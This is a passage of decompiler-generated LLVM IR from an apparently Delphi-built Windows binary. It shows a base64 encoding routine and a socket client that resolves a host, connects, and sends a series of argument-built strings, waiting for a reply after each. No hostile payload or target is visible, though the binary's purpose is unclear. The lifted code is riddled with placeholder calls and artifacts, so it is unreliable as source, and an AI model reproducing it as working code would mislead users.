  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !764
  br label %dec_label_pc_4053f8, !insn.addr !764

dec_label_pc_4053eb:                              ; preds = %dec_label_pc_4053b5
  ret i32 %81, !insn.addr !764

dec_label_pc_4053ec:                              ; preds = %dec_label_pc_40534b
  %94 = load i32, i32* %eax, align 4, !insn.addr !765
  ret i32 %94, !insn.addr !765

dec_label_pc_4053f4:                              ; preds = %dec_label_pc_40537d
  %95 = load i32, i32* %eax, align 4, !insn.addr !766
  %96 = zext i32 %95 to i64, !insn.addr !766
  %97 = zext i32 %arg3 to i64, !insn.addr !766
  %98 = mul i64 %97, 4294967296, !insn.addr !766
  %99 = or i64 %98, %96, !insn.addr !766
  %100 = zext i32 %arg2 to i64, !insn.addr !766
  %101 = sdiv i64 %99, %100, !insn.addr !766
  %102 = trunc i64 %101 to i32, !insn.addr !766
  %103 = add i32 %102, 1, !insn.addr !767
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !767
  br label %dec_label_pc_4053f8, !insn.addr !767

dec_label_pc_4053f8:                              ; preds = %dec_label_pc_4053de, %dec_label_pc_4053f4
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !768
  ret i32 %104, !insn.addr !769

dec_label_pc_4053fc:                              ; preds = %dec_label_pc_405381
  %105 = inttoptr i32 %1 to i32*, !insn.addr !770
  %106 = load i32, i32* %105, align 4, !insn.addr !770
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !770
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !771
  %109 = load i32, i32* %108, align 4, !insn.addr !771
  %110 = add i32 %109, %107, !insn.addr !771
  store i32 %110, i32* %108, align 4, !insn.addr !771
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !772
  %113 = inttoptr i32 %112 to i8*, !insn.addr !772
  %114 = load i8, i8* %113, align 1, !insn.addr !772
  %115 = trunc i32 %111 to i8, !insn.addr !772
  %116 = add i8 %114, %115, !insn.addr !772
  store i8 %116, i8* %113, align 1, !insn.addr !772
  %117 = load i32, i32* %eax, align 4, !insn.addr !773
  ret i32 %117, !insn.addr !773
}

define i32 @function_405404() local_unnamed_addr {
dec_label_pc_405404:
  %ebx.0.reg2mem = alloca i32, !insn.addr !774
  %esp.0.reg2mem = alloca i32, !insn.addr !774
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !775
  %3 = inttoptr i32 %2 to i32*, !insn.addr !775
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !776
  %13 = inttoptr i32 %12 to i32*, !insn.addr !776
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !774
  br label %dec_label_pc_405406, !insn.addr !774

dec_label_pc_405406:                              ; preds = %dec_label_pc_405551, %dec_label_pc_405404
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !777
  %25 = add i32 %24, 3, !insn.addr !778
  %26 = load i32, i32* %3, align 4, !insn.addr !775
  %27 = icmp sgt i32 %25, %26, !insn.addr !779
  br i1 %27, label %dec_label_pc_4054a6, label %dec_label_pc_405417, !insn.addr !779

dec_label_pc_405417:                              ; preds = %dec_label_pc_405406
  %28 = add i32 %24, %0, !insn.addr !780
  %29 = inttoptr i32 %28 to i8*, !insn.addr !780
  %30 = load i8, i8* %29, align 1, !insn.addr !780
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !781
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405350 to i32), !insn.addr !782
  %34 = inttoptr i32 %33 to i8*, !insn.addr !782
  %35 = load i8, i8* %34, align 1, !insn.addr !782
  store i8 %35, i8* %5, align 1, !insn.addr !783
  %36 = load i8, i8* %29, align 1, !insn.addr !784
  %37 = mul i8 %36, 16, !insn.addr !785
  %38 = and i8 %37, 48, !insn.addr !786
  %39 = add i32 %28, 1, !insn.addr !787
  %40 = inttoptr i32 %39 to i8*, !insn.addr !787
  %41 = load i8, i8* %40, align 1, !insn.addr !787
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !788
  %44 = zext i8 %43 to i32, !insn.addr !788
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405350 to i32), !insn.addr !789
  %46 = inttoptr i32 %45 to i8*, !insn.addr !789
  %47 = load i8, i8* %46, align 1, !insn.addr !789
  store i8 %47, i8* %7, align 1, !insn.addr !790
  %48 = load i8, i8* %40, align 1, !insn.addr !791
  %49 = mul i8 %48, 4, !insn.addr !792
  %50 = and i8 %49, 60, !insn.addr !793
  %51 = add i32 %28, 2, !insn.addr !794
  %52 = inttoptr i32 %51 to i8*, !insn.addr !794
  %53 = load i8, i8* %52, align 1, !insn.addr !794
  %54 = udiv i8 %53, 64, !insn.addr !795
  %55 = or i8 %54, %50, !insn.addr !796
  %56 = zext i8 %55 to i32, !insn.addr !796
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405350 to i32), !insn.addr !797
  %58 = inttoptr i32 %57 to i8*, !insn.addr !797
  %59 = load i8, i8* %58, align 1, !insn.addr !797
  store i8 %59, i8* %9, align 1, !insn.addr !798
  %60 = and i8 %53, 63, !insn.addr !799
  %61 = zext i8 %60 to i32, !insn.addr !799
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405350 to i32), !insn.addr !800
  %63 = inttoptr i32 %62 to i8*, !insn.addr !800
  %64 = load i8, i8* %63, align 1, !insn.addr !800
  store i8 %64, i8* %11, align 1, !insn.addr !801
  br label %dec_label_pc_405551, !insn.addr !802

dec_label_pc_4054a6:                              ; preds = %dec_label_pc_405406
  %65 = add i32 %24, 2, !insn.addr !803
  %66 = icmp sgt i32 %65, %26, !insn.addr !804
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405350 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_405515, label %dec_label_pc_4054b0, !insn.addr !804

dec_label_pc_4054b0:                              ; preds = %dec_label_pc_4054a6
  %76 = mul i8 %75, 16, !insn.addr !805
  %77 = and i8 %76, 48, !insn.addr !806
  %78 = add i32 %67, 1, !insn.addr !807
  %79 = inttoptr i32 %78 to i8*, !insn.addr !807
  %80 = load i8, i8* %79, align 1, !insn.addr !807
  %81 = zext i8 %80 to i32, !insn.addr !807
  %82 = udiv i8 %80, 16, !insn.addr !808
  %83 = or i8 %82, %77, !insn.addr !809
  %84 = zext i8 %83 to i32, !insn.addr !809
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405350 to i32), !insn.addr !810
  %86 = inttoptr i32 %85 to i8*, !insn.addr !810
  %87 = load i8, i8* %86, align 1, !insn.addr !810
  store i8 %87, i8* %7, align 1, !insn.addr !811
  %88 = mul i32 %81, 4, !insn.addr !812
  %89 = and i32 %88, 60, !insn.addr !813
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405350 to i32), !insn.addr !814
  %91 = inttoptr i32 %90 to i8*, !insn.addr !814
  %92 = load i8, i8* %91, align 4, !insn.addr !814
  store i8 %92, i8* %9, align 1, !insn.addr !815
  store i8 61, i8* %11, align 1, !insn.addr !816
  br label %dec_label_pc_405551, !insn.addr !817

dec_label_pc_405515:                              ; preds = %dec_label_pc_4054a6
  %93 = zext i8 %75 to i32, !insn.addr !818
  %94 = mul i32 %93, 16, !insn.addr !819
  %95 = and i32 %94, 48, !insn.addr !820
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405350 to i32), !insn.addr !821
  %97 = inttoptr i32 %96 to i8*, !insn.addr !821
  %98 = load i8, i8* %97, align 16, !insn.addr !821
  store i8 %98, i8* %7, align 1, !insn.addr !822
  store i8 61, i8* %9, align 1, !insn.addr !823
  store i8 61, i8* %11, align 1, !insn.addr !824
  br label %dec_label_pc_405551, !insn.addr !824

dec_label_pc_405551:                              ; preds = %dec_label_pc_405515, %dec_label_pc_4054b0, %dec_label_pc_405417
  %99 = load i32, i32* %13, align 4, !insn.addr !776
  %100 = inttoptr i32 %99 to i32*, !insn.addr !825
  %101 = load i32, i32* %100, align 4, !insn.addr !825
  %102 = add i32 %esp.0.reload, -4, !insn.addr !825
  %103 = inttoptr i32 %102 to i32*, !insn.addr !825
  store i32 %101, i32* %103, align 4, !insn.addr !825
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !826
  %105 = load i32, i32* %15, align 4, !insn.addr !827
  %106 = add i32 %esp.0.reload, -8, !insn.addr !827
  %107 = inttoptr i32 %106 to i32*, !insn.addr !827
  store i32 %105, i32* %107, align 4, !insn.addr !827
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !828
  %109 = load i32, i32* %17, align 4, !insn.addr !829
  %110 = add i32 %esp.0.reload, -12, !insn.addr !829
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !829
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !830
  %113 = load i32, i32* %19, align 4, !insn.addr !831
  %114 = add i32 %esp.0.reload, -16, !insn.addr !831
  %115 = inttoptr i32 %114 to i32*, !insn.addr !831
  store i32 %113, i32* %115, align 4, !insn.addr !831
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !832
  %117 = load i32, i32* %21, align 4, !insn.addr !833
  %118 = add i32 %esp.0.reload, -20, !insn.addr !833
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !833
  %120 = call i32 @"@LStrCatN"(), !insn.addr !834
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !835
  %122 = load i32, i32* %23, align 4, !insn.addr !836
  %123 = add i32 %122, -1, !insn.addr !836
  %124 = icmp eq i32 %123, 0, !insn.addr !836
  store i32 %123, i32* %23, align 4, !insn.addr !836
  %125 = icmp eq i1 %124, false, !insn.addr !837
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !837
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !837
  br i1 %125, label %dec_label_pc_405406, label %dec_label_pc_4055a5, !insn.addr !837

dec_label_pc_4055a5:                              ; preds = %dec_label_pc_405551
  %126 = load i32, i32* %119, align 4, !insn.addr !838
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !839
  store i32 4216263, i32* %111, align 4, !insn.addr !840
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !841
  ret i32 %127, !insn.addr !842
}

define i32 @function_4055c0() local_unnamed_addr {
dec_label_pc_4055c0:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !843
  ret i32 %0, !insn.addr !843
}

define i32 @function_4055c5() local_unnamed_addr {
dec_label_pc_4055c5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !844
}

define i32 @function_4055c7(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !845
}

define i32 @function_4055d0() local_unnamed_addr {
dec_label_pc_4055d0:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !846
  %0 = call i32 @function_4036c8(), !insn.addr !847
  %1 = inttoptr i32 %0 to i8*, !insn.addr !848
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !849
  %3 = call i32 @"@FillChar"(), !insn.addr !850
  %4 = icmp eq %hostent* %2, null, !insn.addr !851
  br i1 %4, label %dec_label_pc_40561b, label %dec_label_pc_4055f9, !insn.addr !852

dec_label_pc_4055f9:                              ; preds = %dec_label_pc_4055d0
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !849
  %6 = add i32 %5, 12, !insn.addr !853
  %7 = inttoptr i32 %6 to i32*, !insn.addr !853
  %8 = load i32, i32* %7, align 4, !insn.addr !853
  %9 = inttoptr i32 %8 to i32*, !insn.addr !854
  %10 = load i32, i32* %9, align 4, !insn.addr !854
  %11 = inttoptr i32 %10 to i8*, !insn.addr !855
  %12 = load i8, i8* %11, align 1, !insn.addr !855
  %13 = sext i8 %12 to i32, !insn.addr !856
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !857
  br label %dec_label_pc_40561b, !insn.addr !857

dec_label_pc_40561b:                              ; preds = %dec_label_pc_4055f9, %dec_label_pc_4055d0
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !858
}

define i32 @function_40562c() local_unnamed_addr {
dec_label_pc_40562c:
  %esp.0.reg2mem = alloca i32, !insn.addr !859
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !860
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !861
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !861
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !861
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !862
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !863
  %5 = trunc i32 %4 to i16, !insn.addr !863
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !864
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !865
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !865
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !866
  %9 = icmp eq i32 %8, -1, !insn.addr !867
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !868
  br i1 %9, label %dec_label_pc_4056ba, label %dec_label_pc_40567b, !insn.addr !868

dec_label_pc_40567b:                              ; preds = %dec_label_pc_40562c
  %10 = call i32 @function_4055d0(), !insn.addr !869
  %11 = trunc i32 %10 to i16, !insn.addr !870
  %12 = call i16 @htons(i16 %11), !insn.addr !870
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !871
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !871
  %14 = sext i16 %12 to i32, !insn.addr !872
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !872
  %16 = icmp eq i32 %15, 0, !insn.addr !873
  %17 = icmp eq i1 %16, false, !insn.addr !874
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !874
  br i1 %17, label %dec_label_pc_4056ba, label %dec_label_pc_4056b2, !insn.addr !874

dec_label_pc_4056b2:                              ; preds = %dec_label_pc_40567b
  %18 = inttoptr i32 %0 to i32*, !insn.addr !875
  store i32 %8, i32* %18, align 4, !insn.addr !875
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !876
  br label %dec_label_pc_4056ba, !insn.addr !876

dec_label_pc_4056ba:                              ; preds = %dec_label_pc_4056b2, %dec_label_pc_40567b, %dec_label_pc_40562c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !877
  %20 = load i32, i32* %19, align 4, !insn.addr !877
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !878
  %21 = add i32 %esp.0.reload, 8, !insn.addr !879
  %22 = inttoptr i32 %21 to i32*, !insn.addr !879
  store i32 4216535, i32* %22, align 4, !insn.addr !879
  %23 = call i32 @"@LStrClr"(), !insn.addr !880
  ret i32 %23, !insn.addr !881
}

define i32 @function_4056d0() local_unnamed_addr {
dec_label_pc_4056d0:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !882
  ret i32 %0, !insn.addr !882
}

define i32 @function_4056d5() local_unnamed_addr {
dec_label_pc_4056d5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !883
}

define i32 @function_4056d7(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4056d7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !884
}

define i32 @function_4056e0() local_unnamed_addr {
dec_label_pc_4056e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !885
  %2 = call i32 @WSACleanup(), !insn.addr !886
  ret i32 %2, !insn.addr !887
}

define i32 @function_4056ec() local_unnamed_addr {
dec_label_pc_4056ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !888
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !889
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !889
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !889
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !890
  %4 = call i32 @function_4036c8(), !insn.addr !891
  %5 = call i32 @StrCopy(), !insn.addr !892
  %6 = call i32 @function_407468(i32 4), !insn.addr !893
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !894
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !895
  %9 = call i32 @"@LStrClr"(), !insn.addr !896
  ret i32 %9, !insn.addr !897
}

define i32 @function_40575d() local_unnamed_addr {
dec_label_pc_40575d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !898
  ret i32 %0, !insn.addr !898
}

define i32 @function_405762() local_unnamed_addr {
dec_label_pc_405762:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !899
}

define i32 @function_405764(i32 %arg1) local_unnamed_addr {
dec_label_pc_405764:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !900
}

define i32 @function_40576c() local_unnamed_addr {
dec_label_pc_40576c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !901
  %2 = call i32 @StrPas(), !insn.addr !902
  ret i32 %2, !insn.addr !903
}

define i32 @function_405798(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405798:
  %esp.1.reg2mem = alloca i32, !insn.addr !904
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !904
  %esp.0.reg2mem = alloca i32, !insn.addr !904
  %ecx.0.reg2mem = alloca i32, !insn.addr !904
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !905
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !906
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !906
  br label %dec_label_pc_4057a1, !insn.addr !906

dec_label_pc_4057a1:                              ; preds = %dec_label_pc_4057a1, %dec_label_pc_405798
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !907
  %2 = inttoptr i32 %1 to i32*, !insn.addr !907
  store i32 0, i32* %2, align 4, !insn.addr !907
  %3 = add i32 %esp.0.reload, -8, !insn.addr !908
  %4 = inttoptr i32 %3 to i32*, !insn.addr !908
  store i32 0, i32* %4, align 4, !insn.addr !908
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !909
  %6 = icmp eq i32 %5, 0, !insn.addr !909
  %7 = icmp eq i1 %6, false, !insn.addr !910
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !910
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !910
  br i1 %7, label %dec_label_pc_4057a1, label %dec_label_pc_4057a8, !insn.addr !910

dec_label_pc_4057a8:                              ; preds = %dec_label_pc_4057a1
  %8 = add i32 %esp.0.reload, -12, !insn.addr !911
  %9 = inttoptr i32 %8 to i32*, !insn.addr !911
  store i32 0, i32* %9, align 4, !insn.addr !911
  %10 = call i32 @function_4036b8(), !insn.addr !912
  %11 = call i32 @function_4036b8(), !insn.addr !913
  %12 = call i32 @function_4036b8(), !insn.addr !914
  %13 = call i32 @function_4036b8(), !insn.addr !915
  %14 = call i32 @function_4036b8(), !insn.addr !916
  %15 = call i32 @function_4036b8(), !insn.addr !917
  %16 = call i32 @function_4036b8(), !insn.addr !918
  %17 = add i32 %esp.0.reload, -20, !insn.addr !919
  %18 = inttoptr i32 %17 to i32*, !insn.addr !919
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !919
  store i32 %19, i32* %18, align 4, !insn.addr !919
  %20 = add i32 %esp.0.reload, -24, !insn.addr !920
  %21 = inttoptr i32 %20 to i32*, !insn.addr !920
  store i32 4217357, i32* %21, align 4, !insn.addr !920
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !921
  %23 = add i32 %esp.0.reload, -28, !insn.addr !921
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !921
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !922
  %25 = call i32 @function_40562c(), !insn.addr !923
  %26 = icmp eq i32 %25, 0, !insn.addr !924
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !925
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !925
  br i1 %26, label %dec_label_pc_4059d8, label %dec_label_pc_405816, !insn.addr !925

dec_label_pc_405816:                              ; preds = %dec_label_pc_4057a8
  %27 = add i32 %esp.0.reload, -32, !insn.addr !926
  %28 = inttoptr i32 %27 to i32*, !insn.addr !926
  store i32 ptrtoint ([6 x i8]* @global_var_405a28 to i32), i32* %28, align 4, !insn.addr !926
  %29 = add i32 %esp.0.reload, -36, !insn.addr !927
  %30 = inttoptr i32 %29 to i32*, !insn.addr !927
  %31 = add i32 %esp.0.reload, -40, !insn.addr !928
  %32 = inttoptr i32 %31 to i32*, !insn.addr !928
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %32, align 4, !insn.addr !928
  %33 = call i32 @"@LStrCatN"(), !insn.addr !929
  %34 = call i32 @function_4056ec(), !insn.addr !930
  %35 = call i32 @function_40576c(), !insn.addr !931
  %36 = call i32 @function_4056ec(), !insn.addr !932
  %37 = call i32 @function_40576c(), !insn.addr !933
  %38 = call i32 @"@LStrCat"(), !insn.addr !934
  %39 = call i32 @function_4056ec(), !insn.addr !935
  %40 = call i32 @function_40576c(), !insn.addr !936
  %41 = call i32 @"@LStrCat"(), !insn.addr !937
  %42 = call i32 @function_4056ec(), !insn.addr !938
  %43 = call i32 @function_40576c(), !insn.addr !939
  %44 = add i32 %esp.0.reload, -44, !insn.addr !940
  %45 = inttoptr i32 %44 to i32*, !insn.addr !940
  store i32 ptrtoint ([13 x i8]* @global_var_405a5c to i32), i32* %45, align 4, !insn.addr !940
  %46 = add i32 %esp.0.reload, -48, !insn.addr !941
  %47 = inttoptr i32 %46 to i32*, !insn.addr !941
  store i32 %arg1, i32* %47, align 4, !insn.addr !941
  %48 = add i32 %esp.0.reload, -52, !insn.addr !942
  %49 = inttoptr i32 %48 to i32*, !insn.addr !942
  store i32 ptrtoint (i32* @global_var_405a74 to i32), i32* %49, align 4, !insn.addr !942
  %50 = add i32 %esp.0.reload, -56, !insn.addr !943
  %51 = inttoptr i32 %50 to i32*, !insn.addr !943
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %51, align 4, !insn.addr !943
  %52 = call i32 @"@LStrCatN"(), !insn.addr !944
  %53 = call i32 @function_4056ec(), !insn.addr !945
  %54 = call i32 @function_40576c(), !insn.addr !946
  %55 = add i32 %esp.0.reload, -60, !insn.addr !947
  %56 = inttoptr i32 %55 to i32*, !insn.addr !947
  store i32 ptrtoint ([11 x i8]* @global_var_405a80 to i32), i32* %56, align 4, !insn.addr !947
  %57 = add i32 %esp.0.reload, -64, !insn.addr !948
  %58 = inttoptr i32 %57 to i32*, !insn.addr !948
  store i32 %arg2, i32* %58, align 4, !insn.addr !948
  %59 = add i32 %esp.0.reload, -68, !insn.addr !949
  %60 = inttoptr i32 %59 to i32*, !insn.addr !949
  store i32 ptrtoint (i32* @global_var_405a74 to i32), i32* %60, align 4, !insn.addr !949
  %61 = add i32 %esp.0.reload, -72, !insn.addr !950
  %62 = inttoptr i32 %61 to i32*, !insn.addr !950
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %62, align 4, !insn.addr !950
  %63 = call i32 @"@LStrCatN"(), !insn.addr !951
  %64 = call i32 @function_4056ec(), !insn.addr !952
  %65 = call i32 @function_40576c(), !insn.addr !953
  %66 = call i32 @function_4056ec(), !insn.addr !954
  %67 = call i32 @function_40576c(), !insn.addr !955
  %68 = add i32 %esp.0.reload, -76, !insn.addr !956
  %69 = inttoptr i32 %68 to i32*, !insn.addr !956
  store i32 ptrtoint ([8 x i8]* @global_var_405aa4 to i32), i32* %69, align 4, !insn.addr !956
  %70 = add i32 %esp.0.reload, -80, !insn.addr !957
  %71 = inttoptr i32 %70 to i32*, !insn.addr !957
  store i32 %arg1, i32* %71, align 4, !insn.addr !957
  %72 = add i32 %esp.0.reload, -84, !insn.addr !958
  %73 = inttoptr i32 %72 to i32*, !insn.addr !958
  store i32 ptrtoint (i32* @global_var_405a74 to i32), i32* %73, align 4, !insn.addr !958
  %74 = add i32 %esp.0.reload, -88, !insn.addr !959
  %75 = inttoptr i32 %74 to i32*, !insn.addr !959
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %75, align 4, !insn.addr !959
  %76 = add i32 %esp.0.reload, -92, !insn.addr !960
  %77 = inttoptr i32 %76 to i32*, !insn.addr !960
  store i32 ptrtoint ([6 x i8]* @global_var_405ab4 to i32), i32* %77, align 4, !insn.addr !960
  %78 = add i32 %esp.0.reload, -96, !insn.addr !961
  %79 = inttoptr i32 %78 to i32*, !insn.addr !961
  store i32 %arg2, i32* %79, align 4, !insn.addr !961
  %80 = add i32 %esp.0.reload, -100, !insn.addr !962
  %81 = inttoptr i32 %80 to i32*, !insn.addr !962
  store i32 ptrtoint (i32* @global_var_405a74 to i32), i32* %81, align 4, !insn.addr !962
  %82 = add i32 %esp.0.reload, -104, !insn.addr !963
  %83 = inttoptr i32 %82 to i32*, !insn.addr !963
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %83, align 4, !insn.addr !963
  %84 = add i32 %esp.0.reload, -108, !insn.addr !964
  %85 = inttoptr i32 %84 to i32*, !insn.addr !964
  store i32 ptrtoint ([10 x i8]* @global_var_405ac4 to i32), i32* %85, align 4, !insn.addr !964
  %86 = add i32 %esp.0.reload, -112, !insn.addr !965
  %87 = inttoptr i32 %86 to i32*, !insn.addr !965
  store i32 %arg3, i32* %87, align 4, !insn.addr !965
  %88 = add i32 %esp.0.reload, -116, !insn.addr !966
  %89 = inttoptr i32 %88 to i32*, !insn.addr !966
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %89, align 4, !insn.addr !966
  %90 = add i32 %esp.0.reload, -120, !insn.addr !967
  %91 = inttoptr i32 %90 to i32*, !insn.addr !967
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %91, align 4, !insn.addr !967
  %92 = add i32 %esp.0.reload, -124, !insn.addr !968
  %93 = inttoptr i32 %92 to i32*, !insn.addr !968
  store i32 %arg4, i32* %93, align 4, !insn.addr !968
  %94 = add i32 %esp.0.reload, -128, !insn.addr !969
  %95 = inttoptr i32 %94 to i32*, !insn.addr !969
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %95, align 4, !insn.addr !969
  %96 = add i32 %esp.0.reload, -132, !insn.addr !970
  %97 = inttoptr i32 %96 to i32*, !insn.addr !970
  store i32 ptrtoint (i32* @global_var_405ad8 to i32), i32* %97, align 4, !insn.addr !970
  %98 = add i32 %esp.0.reload, -136, !insn.addr !971
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a38 to i32), i32* %99, align 4, !insn.addr !971
  %100 = call i32 @"@LStrCatN"(), !insn.addr !972
  %101 = call i32 @function_4056ec(), !insn.addr !973
  %102 = call i32 @function_40576c(), !insn.addr !974
  %103 = call i32 @function_4056ec(), !insn.addr !975
  %104 = call i32 @function_40576c(), !insn.addr !976
  %105 = call i32 @function_4056e0(), !insn.addr !977
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !978
